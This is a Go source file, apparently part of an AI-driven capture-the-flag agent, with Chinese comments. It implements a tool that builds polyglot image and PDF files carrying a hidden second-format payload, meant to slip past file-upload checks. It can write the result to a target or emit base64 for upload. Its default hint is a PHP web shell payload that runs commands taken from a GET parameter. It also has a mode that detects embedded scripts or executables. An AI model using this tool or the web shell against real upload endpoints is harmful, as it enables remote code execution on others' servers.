package kernel

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"hash/crc32"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"strings"

	"ctfagent/internal/llm"
)

// ---------------------------------------------------------------------------
// polyglot：造一个「主格式合法、同时带第二格式」的文件
//
// 上传题的校验通常是「先按魔术字节判主格式，再看结构是否完整」，
// 然后把文件交给下游解析器（PHP 引擎 / 浏览器 / 解压器）。
// 下游看到的是**第二个格式**，于是同一份文件在两个解析器眼里是两种东西。
// 手工拼要算偏移、CRC、结束标记，容易错；这里固化几种最常用的组合。
// ---------------------------------------------------------------------------

func (t *ToolSet) doPolyglot(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		Carrier string `json:"carrier"` // png / gif / jpg / pdf
		Payload string `json:"payload"`
		Embed   string `json:"embed"`   // text（默认：塞进元数据块）/ append（追加到文件尾）
		SaveTo  string `json:"save_to"` // 写到目标环境的路径（可选）
		Detect  string `json:"detect"`  // 只分析已有文件，不生成
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	if a.Detect != "" {
		data, err := t.rt.ReadFile(ctx, a.Detect, 8<<20)
		if err != nil {
			return "读文件失败: " + err.Error()
		}
		return describePolyglot(a.Detect, data)
	}
	if a.Payload == "" {
		return "需要 payload，例如：<?php system($_GET[0]); ?>"
	}
	carrier := strings.ToLower(strings.TrimSpace(a.Carrier))
	if carrier == "" {
		carrier = "png"
	}
	data, err := buildPolyglot(carrier, a.Payload, a.Embed)
	if err != nil {
		return "生成失败: " + err.Error()
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "已生成 %s 复合文件，%d 字节\n", carrier, len(data))
	sb.WriteString(describePolyglot("(内存)", data))
	if a.SaveTo != "" {
		if err := t.rt.WriteFile(ctx, a.SaveTo, data); err != nil {
			fmt.Fprintf(&sb, "\n写文件失败: %v", err)
		} else {
			fmt.Fprintf(&sb, "\n已写到 %s —— 直接用它上传，不必再落地一次。", a.SaveTo)
		}
	} else {
		sb.WriteString("\nbase64（供 POST 上传）：\n")
		sb.WriteString(base64.StdEncoding.EncodeToString(data))
	}
	return sb.String()
}

// buildPolyglot 按载体类型生成复合文件。
// embed: "" / "text" = 塞进元数据块（结构最干净）；"append" = 追加到文件尾（最省事）。
func buildPolyglot(carrier, payload, embed string) ([]byte, error) {
	appendMode := strings.EqualFold(embed, "append")
	switch carrier {
	case "png":
		base, err := minimalPNG()
		if err != nil {
			return nil, err
		}
		if appendMode {
			return append(base, []byte(payload)...), nil
		}
		// 在 IEND 之前插入一个 tEXt 块：PNG 解析器会把它当注释跳过，
		// PHP/JS 解析器则能在文件里看到自己的起始标记。
		return insertPNGTextChunk(base, "Comment", payload)
	case "gif":
		base, err := minimalGIF()
		if err != nil {
			return nil, err
		}
		if appendMode {
			return append(base, []byte(payload)...), nil
		}
		// GIF 的注释扩展块：0x21 0xFE <len> <data> 0x00
		var b bytes.Buffer
		b.Write(base[:len(base)-1]) // 去掉结尾 0x3B 之前的部分
		b.WriteByte(0x21)
		b.WriteByte(0xFE)
		for len(payload) > 0 { // 分块，每块最多 255 字节
			n := len(payload)
			if n > 255 {
				n = 255
			}
			b.WriteByte(byte(n))
			b.WriteString(payload[:n])
			payload = payload[n:]
		}
		b.WriteByte(0x00)
		b.WriteByte(0x3B) // GIF trailer
		return b.Bytes(), nil
	case "jpg", "jpeg":
		base, err := minimalJPEG()
		if err != nil {
			return nil, err
		}
		// JPEG 在 EOI(FFD9) 之后的内容会被多数解析器忽略
		return append(base, []byte(payload)...), nil
	case "pdf":
		base := minimalPDF()
		// 在 %%EOF 之后追加：PDF 阅读器读到 EOF 就停，其它解析器还能看到内容
		return append(base, []byte("\n"+payload+"\n")...), nil
	}
	return nil, fmt.Errorf("不支持的载体 %q（可选 png / gif / jpg / pdf）", carrier)
}

// insertPNGTextChunk 在 IEND 之前插入一个 tEXt 块。
func insertPNGTextChunk(base []byte, keyword, text string) ([]byte, error) {
	i := bytes.LastIndex(base, []byte("IEND"))
	if i < 4 {
		return nil, fmt.Errorf("PNG 结构异常：找不到 IEND")
	}
	start := i - 4 // 长度字段
	var chunk bytes.Buffer
	body := append([]byte(keyword), 0)
	body = append(body, []byte(text)...)
	chunk.Write(binaryUint32(uint32(len(body))))
	chunk.WriteString("tEXt")
	chunk.Write(body)
	chunk.Write(binaryUint32(crc32.ChecksumIEEE(append([]byte("tEXt"), body...))))

	out := make([]byte, 0, len(base)+chunk.Len())
	out = append(out, base[:start]...)
	out = append(out, chunk.Bytes()...)
	out = append(out, base[start:]...)
	return out, nil
}

func binaryUint32(v uint32) []byte {
	return []byte{byte(v >> 24), byte(v >> 16), byte(v >> 8), byte(v)}
}

func minimalPNG() ([]byte, error) {
	img := image.NewRGBA(image.Rect(0, 0, 1, 1))
	img.Set(0, 0, color.RGBA{R: 0x20, G: 0x30, B: 0x40, A: 0xff})
	var b bytes.Buffer
	if err := png.Encode(&b, img); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}

func minimalGIF() ([]byte, error) {
	img := image.NewPaletted(image.Rect(0, 0, 1, 1), color.Palette{color.Black, color.White})
	var b bytes.Buffer
	if err := gif.Encode(&b, img, nil); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}

func minimalJPEG() ([]byte, error) {
	img := image.NewRGBA(image.Rect(0, 0, 1, 1))
	img.Set(0, 0, color.RGBA{R: 0x20, G: 0x30, B: 0x40, A: 0xff})
	var b bytes.Buffer
	if err := jpeg.Encode(&b, img, &jpeg.Options{Quality: 60}); err != nil {
		return nil, err
	}
	return b.Bytes(), nil
}

func minimalPDF() []byte {
	body := "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
		"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]>>endobj\n" +
		"trailer<</Root 1 0 R>>\n%%EOF\n"
	return []byte(body)
}

// describePolyglot 说明「主格式是什么、还能被谁解析」。
func describePolyglot(name string, data []byte) string {
	primary := sniffPrimary(data)
	var sb strings.Builder
	fmt.Fprintf(&sb, "· %s：主格式判别 = %s\n", name, primary)
	type sig struct {
		marker string
		label  string
	}
	sigs := []sig{
		{"<?php", "PHP 脚本"},
		{"<?=", "PHP 短标签"},
		{"<script", "HTML/JS"},
		{"<svg", "SVG"},
		{"PK\x03\x04", "ZIP 归档"},
		{"%PDF", "PDF"},
		{"\x7fELF", "ELF 可执行"},
		{"MZ", "PE 可执行"},
	}
	var hits []string
	for _, s := range sigs {
		if idx := bytes.Index(data, []byte(s.marker)); idx >= 0 {
			hits = append(hits, fmt.Sprintf("%s @偏移 %d", s.label, idx))
		}
	}
	if len(hits) == 0 {
		sb.WriteString("· 没有检测到第二格式 —— 换一个 payload，或试 embed=append\n")
		return sb.String()
	}
	sb.WriteString("· 第二格式：" + strings.Join(hits, "；") + "\n")
	sb.WriteString("· 上传后若后端把文件交给对应解析器（PHP/浏览器/解压器），执行面就在这里")
	return sb.String()
}

func sniffPrimary(data []byte) string {
	switch {
	case len(data) >= 8 && bytes.HasPrefix(data, []byte("\x89PNG\r\n\x1a\n")):
		return "png"
	case len(data) >= 6 && (bytes.HasPrefix(data, []byte("GIF87a")) || bytes.HasPrefix(data, []byte("GIF89a"))):
		return "gif"
	case len(data) >= 3 && data[0] == 0xff && data[1] == 0xd8 && data[2] == 0xff:
		return "jpg"
	case bytes.HasPrefix(data, []byte("%PDF")):
		return "pdf"
	case bytes.HasPrefix(data, []byte("PK\x03\x04")):
		return "zip"
	}
	return "未知"
}
